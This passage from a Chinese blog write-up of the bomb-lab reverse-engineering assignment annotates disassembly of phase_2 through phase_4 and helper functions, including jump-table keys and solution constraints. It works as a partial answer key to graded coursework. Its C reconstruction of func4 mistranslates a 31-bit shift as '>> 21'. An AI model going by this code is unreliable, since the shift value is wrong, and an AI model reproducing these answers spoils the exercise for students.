&#x2F;&#x2F;常数地址指针++</span><br><span class="line">    0x000000000040137a &lt;+66&gt;:	movzbl (%rbx),%eax  </span><br><span class="line">    0x000000000040137d &lt;+69&gt;:	test   %al,%al      &#x2F;&#x2F;如果字符串不空</span><br><span class="line">    0x000000000040137f &lt;+71&gt;:	jne    0x40136a &lt;strings_not_equal+50&gt; &#x2F;&#x2F;转+50</span><br><span class="line">    0x0000000000401381 &lt;+73&gt;:	mov    $0x0,%edx	&#x2F;&#x2F;如果串1空</span><br><span class="line">    0x0000000000401386 &lt;+78&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x0000000000401388 &lt;+80&gt;:	mov    $0x0,%edx	&#x2F;&#x2F;上接41,串1空, 返回0</span><br><span class="line">    0x000000000040138d &lt;+85&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x000000000040138f &lt;+87&gt;:	mov    $0x1,%edx    &#x2F;&#x2F;上接48,串12不等,返回1</span><br><span class="line">    0x0000000000401394 &lt;+92&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x0000000000401396 &lt;+94&gt;:	mov    $0x1,%edx    &#x2F;&#x2F;上接94,串不等,返回1</span><br><span class="line">    0x000000000040139b &lt;+99&gt;:	mov    %edx,%eax    &#x2F;&#x2F;上接34,长度不等,返回1</span><br><span class="line">    0x000000000040139d &lt;+101&gt;:	pop    %rbx </span><br><span class="line">    0x000000000040139e &lt;+102&gt;:	pop    %rbp</span><br><span class="line">    0x000000000040139f &lt;+103&gt;:	pop    %r12 &#x2F;&#x2F;恢复环境</span><br><span class="line">    0x00000000004013a1 &lt;+105&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>注:</p>
<ol>
<li><p>开头结尾有保存环境的push与pop操作</p>
</li>
<li><p>r12d 指12寄存器的双字部分, 依次是:r12, r12d, r12w, r12b. d疑似指double word</p>
</li>
<li><p>nopl 为无操作, 可参考<a href="https://exp.newsmth.net/topic/article/9a37ce02c405b2b7ae9558f161f38c38" target="_blank" rel="noopener">这里</a>.</p>
</li>
<li><p>过程:</p>
<ol>
<li>先比较两串的长度,若不同直接返回1(+34); </li>
<li>然后一个一个bit地比较, 每次比较完跳转回+50, 直到全部比较结束, 串为空,返回0</li>
<li>当比较中遇到串不等, 立刻退出,返回1</li>
</ol>
</li>
<li><p>疑惑:</p>
<ol>
<li><p>为什么每次指针仅仅是自加? 每次是对al比较(1byte), 指针+4岂不美哉?</p>
</li>
<li><p>87,94,99都是出错, 返回1, 为什么不合并成1个? </p>
<p>(猜测:可能是优化级别不够, 照顾我们的智力水平😂)</p>
</li>
</ol>
</li>
</ol>
<h3 id="string-length"><a href="#string-length" class="headerlink" title="string_length"></a>string_length</h3><ul>
<li>输入: 字符指针</li>
<li>功能: 返回指向的串的长度, 空返回0</li>
<li>无调用</li>
<li>返回: 返回指向的串的长度, 空返回0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdi &#x3D; *input; </span><br><span class="line">Dump of assembler code for function string_length:</span><br><span class="line">    0x000000000040131b &lt;+0&gt;:	cmpb   $0x0,(%rdi)      </span><br><span class="line">    0x000000000040131e &lt;+3&gt;:	je     0x401332 &lt;string_length+23&gt;  &#x2F;&#x2F;如果input空, 转23(返回0)</span><br><span class="line">    0x0000000000401320 &lt;+5&gt;:	mov    %rdi,%rdx        &#x2F;&#x2F;rdx &#x3D; *input</span><br><span class="line">    0x0000000000401323 &lt;+8&gt;:	add    $0x1,%rdx        &#x2F;&#x2F;rdx ++ 每轮将指针+1 </span><br><span class="line">    0x0000000000401327 &lt;+12&gt;:	mov    %edx,%eax    &#x2F;&#x2F;eax &#x3D;rdx</span><br><span class="line">    0x0000000000401329 &lt;+14&gt;:	sub    %edi,%eax    &#x2F;&#x2F;eax -&#x3D; edi, 当前指针与原指针差值</span><br><span class="line">    0x000000000040132b &lt;+16&gt;:	cmpb   $0x0,(%rdx)  &#x2F;&#x2F;指针指向与0比较</span><br><span class="line">    0x000000000040132e &lt;+19&gt;:	jne    0x401323 &lt;string_length+8&gt;&#x2F;&#x2F;当指向非零, 表示还未结束 递归调用</span><br><span class="line">    0x0000000000401330 &lt;+21&gt;:	repz retq   &#x2F;&#x2F;返还rax 即最后的差值, 为指针储存的数据的长度</span><br><span class="line">    0x0000000000401332 &lt;+23&gt;:	mov    $0x0,%eax    &#x2F;&#x2F;(上接+3) 返回0</span><br><span class="line">    0x0000000000401337 &lt;+28&gt;:	retq</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h3><ul>
<li>输入: *input</li>
<li>功能: 与六个数字比较, 不同炸</li>
<li>调用: read_six_numbers</li>
<li>返回: 无</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">&#x2F;&#x2F;rdi *input</span><br><span class="line">    0x0000000000400efc &lt;+0&gt;:	push   %rbp</span><br><span class="line">    0x0000000000400efd &lt;+1&gt;:	push   %rbx			&#x2F;&#x2F;保存环境</span><br><span class="line">    0x0000000000400efe &lt;+2&gt;:	sub    $0x28,%rsp   &#x2F;&#x2F;栈分28位</span><br><span class="line">    0x0000000000400f02 &lt;+6&gt;:	mov    %rsp,%rsi    &#x2F;&#x2F;栈指针作为第二个参数</span><br><span class="line">    0x0000000000400f05 &lt;+9&gt;:	callq  0x40145c &lt;read_six_numbers&gt;	&#x2F;&#x2F;读数在栈内</span><br><span class="line">    0x0000000000400f0a &lt;+14&gt;:	cmpl   $0x1,(%rsp)  &#x2F;&#x2F;栈顶元素与1比较</span><br><span class="line">    0x0000000000400f0e &lt;+18&gt;:	je     0x400f30 &lt;phase_2+52&gt;    &#x2F;&#x2F;不同炸, 相同转52</span><br><span class="line">    0x0000000000400f10 &lt;+20&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f15 &lt;+25&gt;:	jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">    0x0000000000400f17 &lt;+27&gt;:	mov    -0x4(%rbx),%eax      &#x2F;&#x2F;eax &#x3D; 栈元素前一个元素</span><br><span class="line">    0x0000000000400f1a &lt;+30&gt;:	add    %eax,%eax            &#x2F;&#x2F;eax *&#x3D; 2</span><br><span class="line">    0x0000000000400f1c &lt;+32&gt;:	cmp    %eax,(%rbx)              &#x2F;&#x2F;rbx(下一个元素)与eax(两倍的上一个元素)比较</span><br><span class="line">    0x0000000000400f1e &lt;+34&gt;:	je     0x400f25 &lt;phase_2+41&gt;    &#x2F;&#x2F;不同炸,相同转41</span><br><span class="line">    0x0000000000400f20 &lt;+36&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f25 &lt;+41&gt;:	add    $0x4,%rbx            &#x2F;&#x2F;rbx &#x3D; 栈下一个元素</span><br><span class="line">    0x0000000000400f29 &lt;+45&gt;:	cmp    %rbp,%rbx            &#x2F;&#x2F;rbx 与 rbp比较</span><br><span class="line">    0x0000000000400f2c &lt;+48&gt;:	jne    0x400f17 &lt;phase_2+27&gt;    &#x2F;&#x2F;不同转27,继续轮回</span><br><span class="line">    0x0000000000400f2e &lt;+50&gt;:	jmp    0x400f3c &lt;phase_2+64&gt;&#x2F;&#x2F;相同,第六个元素 转64</span><br><span class="line">    0x0000000000400f30 &lt;+52&gt;:	lea    0x4(%rsp),%rbx       &#x2F;&#x2F;rbx &#x3D; 下一个元素</span><br><span class="line">    0x0000000000400f35 &lt;+57&gt;:	lea    0x18(%rsp),%rbp      &#x2F;&#x2F;rbp &#x3D; 栈顶+18(应该是第六个元素,存疑)</span><br><span class="line">    0x0000000000400f3a &lt;+62&gt;:	jmp    0x400f17 &lt;phase_2+27&gt;   &#x2F;&#x2F;转27</span><br><span class="line">    0x0000000000400f3c &lt;+64&gt;:	add    $0x28,%rsp           &#x2F;&#x2F;出栈28位</span><br><span class="line">    0x0000000000400f40 &lt;+68&gt;:	pop    %rbx</span><br><span class="line">    0x0000000000400f41 &lt;+69&gt;:	pop    %rbp             &#x2F;&#x2F;恢复环境</span><br><span class="line">    0x0000000000400f42 &lt;+70&gt;:	retq                    &#x2F;&#x2F;结束</span><br></pre></td></tr></table></figure>
<p>注: </p>
<ol>
<li>read_six_numbers 函数内其实没看懂, 由名字猜测了一波</li>
<li>lea S D指令, 将S(一个有效地址) 复制给D, 后续引用(D)用法类似指针</li>
<li><code>add    $0x4,%rbx</code> 指针下一个元素, 注意栈是倒过来储存的</li>
<li>存疑:<ol>
<li>57 行, <code>%rbp</code>应该是被赋了第六个参数的值. 可是为什么是+18? 不应该是+ 20(4*5)吗?</li>
</ol>
</li>
</ol>
<h3 id="read-six-numbers"><a href="#read-six-numbers" class="headerlink" title="read_six_numbers"></a>read_six_numbers</h3><ul>
<li>输入: *input, 栈指针</li>
<li>功能: 读取6个数据写在内存中</li>
<li>调用: __isoc99_sscanf@plt (疑似库函数?)</li>
<li>返回: 无</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">    0x000000000040145c &lt;+0&gt;:	sub    $0x18,%rsp       &#x2F;&#x2F;分配18</span><br><span class="line">    0x0000000000401460 &lt;+4&gt;:	mov    %rsi,%rdx        &#x2F;&#x2F;rdx &#x3D; 原栈指针</span><br><span class="line">    0x0000000000401463 &lt;+7&gt;:	lea    0x4(%rsi),%rcx   &#x2F;&#x2F;rcx &#x3D; (栈4)</span><br><span class="line">    0x0000000000401467 &lt;+11&gt;:	lea    0x14(%rsi),%rax  &#x2F;&#x2F;rax &#x3D; (栈20)</span><br><span class="line">    0x000000000040146b &lt;+15&gt;:	mov    %rax,0x8(%rsp)   &#x2F;&#x2F;(栈+8) &#x3D; 栈20</span><br><span class="line">    0x0000000000401470 &lt;+20&gt;:	lea    0x10(%rsi),%rax  &#x2F;&#x2F;rax &#x3D; (栈+16)</span><br><span class="line">    0x0000000000401474 &lt;+24&gt;:	mov    %rax,(%rsp)      &#x2F;&#x2F;(rsp) &#x3D; rax &#x3D; (原栈+16)</span><br><span class="line">    0x0000000000401478 &lt;+28&gt;:	lea    0xc(%rsi),%r9    &#x2F;&#x2F;r9 &#x3D; (rsi+12)</span><br><span class="line">    0x000000000040147c &lt;+32&gt;:	lea    0x8(%rsi),%r8    &#x2F;&#x2F;r8 &#x3D; (rsi+8)</span><br><span class="line">    0x0000000000401480 &lt;+36&gt;:	mov    $0x4025c3,%esi   &#x2F;&#x2F;si &#x3D; $0x4025c3</span><br><span class="line">    0x0000000000401485 &lt;+41&gt;:	mov    $0x0,%eax        &#x2F;&#x2F;ax &#x3D; 0</span><br><span class="line">    0x000000000040148a &lt;+46&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">    0x000000000040148f &lt;+51&gt;:	cmp    $0x5,%eax        &#x2F;&#x2F;结果与5比较</span><br><span class="line">    0x0000000000401492 &lt;+54&gt;:	jg     0x401499 &lt;read_six_numbers+61&gt;&#x2F;&#x2F;结果&gt;5 不炸</span><br><span class="line">    0x0000000000401494 &lt;+56&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000401499 &lt;+61&gt;:	add    $0x18,%rsp       &#x2F;&#x2F;收回18</span><br><span class="line">    0x000000000040149d &lt;+65&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>嗯…虽然我没懂他每一步在干什么, 不妨碍我猜出他是用来干啥的.</p>
<h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h3><ul>
<li>输入: *input</li>
<li>功能: 与两个数字比较, 不同炸</li>
<li>调用: __isoc99_sscanf</li>
<li>返回: 无</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdi &#x3D; &amp;input</span><br><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">    0x0000000000400f43 &lt;+0&gt;:	    sub    $0x18,%rsp               &#x2F;&#x2F;栈扩18</span><br><span class="line">    0x0000000000400f47 &lt;+4&gt;:	    lea    0xc(%rsp),%rcx           &#x2F;&#x2F;rcx &#x3D; &amp;(栈12)</span><br><span class="line">    0x0000000000400f4c &lt;+9&gt;:	    lea    0x8(%rsp),%rdx           &#x2F;&#x2F;rdx &#x3D; &amp;(栈8)</span><br><span class="line">    0x0000000000400f51 &lt;+14&gt;:	mov    $0x4025cf,%esi           &#x2F;&#x2F;si &#x3D; $0x4025cf</span><br><span class="line">    0x0000000000400f56 &lt;+19&gt;:	mov    $0x0,%eax                &#x2F;&#x2F;ax &#x3D; $0x0</span><br><span class="line">    0x0000000000400f5b &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;   &#x2F;&#x2F; 见注解p3_1,将2个数字装入栈8 和 栈12处</span><br><span class="line">    0x0000000000400f60 &lt;+29&gt;:	cmp    $0x1,%eax                &#x2F;&#x2F;ax与1比较 </span><br><span class="line">    0x0000000000400f63 &lt;+32&gt;:	jg     0x400f6a &lt;phase_3+39&gt;    &#x2F;&#x2F;ax&gt;1 跳转39 否则炸</span><br><span class="line">    0x0000000000400f65 &lt;+34&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f6a &lt;+39&gt;:	cmpl   $0x7,0x8(%rsp)           &#x2F;&#x2F;*(栈8)与7比较 (也就是数字1与7比较)</span><br><span class="line">    0x0000000000400f6f &lt;+44&gt;:	ja     0x400fad &lt;phase_3+106&gt;   &#x2F;&#x2F;*(栈8)&gt;7(无符号) 转106,炸</span><br><span class="line">    0x0000000000400f71 &lt;+46&gt;:	mov    0x8(%rsp),%eax           &#x2F;&#x2F;ax &#x3D; *(栈8) 数1</span><br><span class="line">    0x0000000000400f75 &lt;+50&gt;:	jmpq   *0x402470(,%rax,8)       &#x2F;&#x2F;跳转到(ax*8+0x402470) 见注解p3_2</span><br><span class="line">    0x0000000000400f7c &lt;+57&gt;:	mov    $0xcf,%eax               &#x2F;&#x2F;上接50 且ax&#x3D;0 key &#x3D; 0xcf &#x3D; 207</span><br><span class="line">    0x0000000000400f81 &lt;+62&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f83 &lt;+64&gt;:	mov    $0x2c3,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;2 key &#x3D; 0x2c3 &#x3D; 707</span><br><span class="line">    0x0000000000400f88 &lt;+69&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f8a &lt;+71&gt;:	mov    $0x100,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;3 key &#x3D; 0x100 &#x3D; 256</span><br><span class="line">    0x0000000000400f8f &lt;+76&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f91 &lt;+78&gt;:	mov    $0x185,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;4 key &#x3D; 0x185 &#x3D; 389</span><br><span class="line">    0x0000000000400f96 &lt;+83&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f98 &lt;+85&gt;:	mov    $0xce,%eax               &#x2F;&#x2F;上接50 且ax&#x3D;5 key &#x3D; 0xce  &#x3D; 206</span><br><span class="line">    0x0000000000400f9d &lt;+90&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f9f &lt;+92&gt;:	mov    $0x2aa,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;6 key &#x3D; 0x2aa &#x3D; 682</span><br><span class="line">    0x0000000000400fa4 &lt;+97&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fa6 &lt;+99&gt;:	mov    $0x147,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;7 key &#x3D; 0x147 &#x3D; 327</span><br><span class="line">    0x0000000000400fab &lt;+104&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fad &lt;+106&gt;:	callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;上接44,输入个数&lt;2</span><br><span class="line">    0x0000000000400fb2 &lt;+111&gt;:	mov    $0x0,%eax                &#x2F;&#x2F;这里是什么情况?存疑</span><br><span class="line">    0x0000000000400fb7 &lt;+116&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fb9 &lt;+118&gt;:	mov    $0x137,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;1 key &#x3D; 0x137 &#x3D; 311</span><br><span class="line">    0x0000000000400fbe &lt;+123&gt;:	cmp    0xc(%rsp),%eax           &#x2F;&#x2F;比较ax(即key)与数2</span><br><span class="line">    0x0000000000400fc2 &lt;+127&gt;:	je     0x400fc9 &lt;phase_3+134&gt;   &#x2F;&#x2F;不等炸</span><br><span class="line">    0x0000000000400fc4 &lt;+129&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400fc9 &lt;+134&gt;:	add    $0x18,%rsp</span><br><span class="line">    0x0000000000400fcd &lt;+138&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>注: </p>
<ol>
<li><p>输入两个数字,分别储存在栈8与栈12处, 多余输入不计</p>
</li>
<li><p>如果输入1个,直接炸</p>
</li>
<li><p>数1(栈8) 若&gt;(unsigned )7, 直接炸</p>
</li>
<li><p>根据数1的不同取值(0~7), 跳转到栈种储存的不同地址, 并根据地址拿到key(存储到ax中)</p>
</li>
<li><p>数2(栈12) 与 key比较, 不同炸, 相同过</p>
</li>
<li><p>疑惑:</p>
<p>+111处是什么时候会运行到? 直接把ax赋0?</p>
</li>
</ol>
<h4 id="注解p3-1"><a href="#注解p3-1" class="headerlink" title="注解p3_1"></a>注解p3_1</h4><p><strong>__isoc99_sscanf()</strong></p>
<p>​    c99标准库sscanf函数, <a href="http://www.cplusplus.com/reference/cstdio/sscanf/" target="_blank" rel="noopener">参考链接</a></p>
<blockquote>
<p>​    int sscanf ( const char <em> s, const char </em> format, …);</p>
<p>​    Read formatted data from string</p>
<p>​    Reads data from s and stores them according to parameter format into the locations given by the additional arguments, as if scanf was used, but reading from s instead of the standard input (stdin).</p>
<p>​    The additional arguments should point to already allocated objects of the type specified by their corresponding format specifier within the format string.</p>
<p>​    Return Value</p>
<p>​    On success, the function returns the number of items in the argument list successfully filled. This count can match the expected number of items or be less (even zero) in the case of a matching failure.</p>
<p>​    In the case of an input failure before any data could be successfully interpreted, EOF is returned. </p>
</blockquote>
<p>​    返回读取到的item的个数</p>
<h4 id="注解p3-2"><a href="#注解p3-2" class="headerlink" title="注解p3_2"></a>注解p3_2</h4><p><strong>每个(ax*8+0x402470)中储存的地址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) print *(int**)  (0x402470+8*0)</span><br><span class="line">$11 &#x3D; (int *) 0x400f7c &lt;phase_3+57&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*1)</span><br><span class="line">$12 &#x3D; (int *) 0x400fb9 &lt;phase_3+118&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*2)</span><br><span class="line">$13 &#x3D; (int *) 0x400f83 &lt;phase_3+64&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*3)</span><br><span class="line">$14 &#x3D; (int *) 0x400f8a &lt;phase_3+71&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*4)</span><br><span class="line">$15 &#x3D; (int *) 0x400f91 &lt;phase_3+78&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*5)</span><br><span class="line">$16 &#x3D; (int *) 0x400f98 &lt;phase_3+85&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*6)</span><br><span class="line">$17 &#x3D; (int *) 0x400f9f &lt;phase_3+92&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*7)</span><br><span class="line">$18 &#x3D; (int *) 0x400fa6 &lt;phase_3+99&gt;</span><br></pre></td></tr></table></figure>
<h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h3><ul>
<li>输入: *input</li>
<li>功能: 与两个数字比较, 相同则炸弹拆除</li>
<li>调用: __isoc99_sscanf</li>
<li>返回: 无</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">    0x000000000040100c &lt;+0&gt;:	sub    $0x18,%rsp               &#x2F;&#x2F;扩栈18</span><br><span class="line">    0x0000000000401010 &lt;+4&gt;:	lea    0xc(%rsp),%rcx           &#x2F;&#x2F;cx 栈12   数2</span><br><span class="line">    0x0000000000401015 &lt;+9&gt;:	lea    0x8(%rsp),%rdx           &#x2F;&#x2F;dx 栈8    数1</span><br><span class="line">    0x000000000040101a &lt;+14&gt;:	mov    $0x4025cf,%esi           &#x2F;&#x2F;si &#x3D; 0x4025cf</span><br><span class="line">    0x000000000040101f &lt;+19&gt;:	mov    $0x0,%eax                &#x2F;&#x2F;ax &#x3D; 0</span><br><span class="line">    0x0000000000401024 &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;   &#x2F;&#x2F;读取</span><br><span class="line">    0x0000000000401029 &lt;+29&gt;:	cmp    $0x2,%eax                &#x2F;&#x2F;读入2个数字</span><br><span class="line">    0x000000000040102c &lt;+32&gt;:	jne    0x401035 &lt;phase_4+41&gt;    &#x2F;&#x2F;读入个数!&#x3D;2,炸</span><br><span class="line">    0x000000000040102e &lt;+34&gt;:	cmpl   $0xe,0x8(%rsp)           &#x2F;&#x2F;数1 与 14比较</span><br><span class="line">    0x0000000000401033 &lt;+39&gt;:	jbe    0x40103a &lt;phase_4+46&gt;    &#x2F;&#x2F;数1 &lt;&#x3D;14 转46</span><br><span class="line">    0x0000000000401035 &lt;+41&gt;:	callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;数1 &gt;14 炸</span><br><span class="line">    0x000000000040103a &lt;+46&gt;:	mov    $0xe,%edx                &#x2F;&#x2F;14赋给dx</span><br><span class="line">    0x000000000040103f &lt;+51&gt;:	mov    $0x0,%esi                &#x2F;&#x2F;si &#x3D; 0</span><br><span class="line">    0x0000000000401044 &lt;+56&gt;:	mov    0x8(%rsp),%edi           &#x2F;&#x2F;di 栈8    数1</span><br><span class="line">    0x0000000000401048 &lt;+60&gt;:	callq  0x400fce &lt;func4&gt;         </span><br><span class="line">    0x000000000040104d &lt;+65&gt;:	test   %eax,%eax                &#x2F;&#x2F;对于返回值ax</span><br><span class="line">    0x000000000040104f &lt;+67&gt;:	jne    0x401058 &lt;phase_4+76&gt;    &#x2F;&#x2F;ax!&#x3D;0 转76 炸</span><br><span class="line">    0x0000000000401051 &lt;+69&gt;:	cmpl   $0x0,0xc(%rsp)           &#x2F;&#x2F;栈12(数2) &#x3D;&#x3D; 0</span><br><span class="line">    0x0000000000401056 &lt;+74&gt;:	je     0x40105d &lt;phase_4+81&gt;    &#x2F;&#x2F;不等炸,等拆</span><br><span class="line">    0x0000000000401058 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x000000000040105d &lt;+81&gt;:	add    $0x18,%rsp</span><br><span class="line">    0x0000000000401061 &lt;+85&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>注:</p>
<ol>
<li>这一块代码还是比较好懂的. 0~32从input中取两个数字放入栈8 栈12 处, 如果不是<strong>两个</strong>数字的话直接炸</li>
<li>34~67 是对数1 检测, 首先数1必须&lt;=14, 否则炸. 然后对数1调用func4函数, 如果返回值!=0直接炸</li>
<li>69~85 是对数2 检测, 简单的令人发指. 不为0炸, 为0炸弹拆除.</li>
</ol>
<h3 id="func4"><a href="#func4" class="headerlink" title="func4"></a>func4</h3><ul>
<li>输入: rdi = 数1 rsi = ?   rdx = 0xe</li>
<li>功能: 对参数进行某种神秘操作, 返回某个值</li>
<li>调用:  func4</li>
<li>返回: 某个int</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一轮: rdi &#x3D; 数1 rsi &#x3D; 0   rdx &#x3D; 0xe </span><br><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:	    sub    $0x8,%rsp            &#x2F;&#x2F;栈扩8</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:	    mov    %edx,%eax            &#x2F;&#x2F;ax &#x3D; dx</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:	    sub    %esi,%eax            &#x2F;&#x2F;ax &#x3D; dx-si</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:	    mov    %eax,%ecx            &#x2F;&#x2F;cx &#x3D; dx-si</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:	shr    $0x1f,%ecx           &#x2F;&#x2F;逻辑右移 cx 31位 正0负1</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:	add    %ecx,%eax            &#x2F;&#x2F;ax +&#x3D; cx</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:	sar    %eax                 &#x2F;&#x2F;ax 算数右移1位</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:	lea    (%rax,%rsi,1),%ecx   &#x2F;&#x2F;cx &#x3D; si + ax</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:	cmp    %edi,%ecx            &#x2F;&#x2F;cx与数1比较 </span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:	jle    0x400ff2 &lt;func4+36&gt;  &#x2F;&#x2F;cx&lt;&#x3D;数1, 转36</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:	lea    -0x1(%rcx),%edx      &#x2F;&#x2F;cx&gt;数1 dx &#x3D; cx-1</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:	callq  0x400fce &lt;func4&gt;     &#x2F;&#x2F;调用func4 di&#x3D;数1,si&#x3D;si,dx&#x3D;cx-1</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:	add    %eax,%eax            &#x2F;&#x2F;返回值ax*&#x3D;2</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:	jmp    0x401007 &lt;func4+57&gt;  &#x2F;&#x2F;返回</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:	mov    $0x0,%eax            &#x2F;&#x2F;上接22 ax &#x3D; 0</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:	cmp    %edi,%ecx            &#x2F;&#x2F;比较cx 数1</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:	jge    0x401007 &lt;func4+57&gt;  &#x2F;&#x2F;cx&gt;&#x3D;数1(也就是cx&#x3D;数1) 转57 返回 </span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:	lea    0x1(%rcx),%esi       &#x2F;&#x2F;cx&lt;数1 si &#x3D; cx+1</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:	callq  0x400fce &lt;func4&gt;     &#x2F;&#x2F;调用func4 di&#x3D;数1,si&#x3D;si&#x3D;cx+1,dx&#x3D;dx</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:	lea    0x1(%rax,%rax,1),%eax    &#x2F;&#x2F;ax&#x3D;2ax+1</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:	add    $0x8,%rsp            </span><br><span class="line">   0x000000000040100b &lt;+61&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>这个函数折磨了我整整24h, 最终没忍住去搜了别人的题解. 下面这一段借鉴了<a href="https://www.jianshu.com/p/33eb51b2024e" target="_blank" rel="noopener">一位简书网友的这篇文章</a></p>
<p>对func4函数进行反汇编:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> v2, <span class="keyword">int</span> v3)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*  x = rdi(数1) </span></span><br><span class="line"><span class="comment">        v2 = rsi(初值0)</span></span><br><span class="line"><span class="comment">        v3 = rdx(初值e)*/</span></span><br><span class="line">    <span class="keyword">int</span> tmp = (v3 - v2) &gt;&gt; <span class="number">21</span>;    		<span class="comment">//逻辑右移</span></span><br><span class="line">    <span class="keyword">int</span> re = ((v3 - v2) + tmp) &gt;&gt; <span class="number">1</span>; 	<span class="comment">//算数右移</span></span><br><span class="line">    tmp = v2 + re;</span><br><span class="line">    <span class="keyword">if</span>(tmp &lt;= x) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp&gt;=x) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        re = fun4(x,tmp+<span class="number">1</span>,v3);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*re+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        re = fun4(x,v2,tmp<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * re;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不妨再写个测试函数:</p>
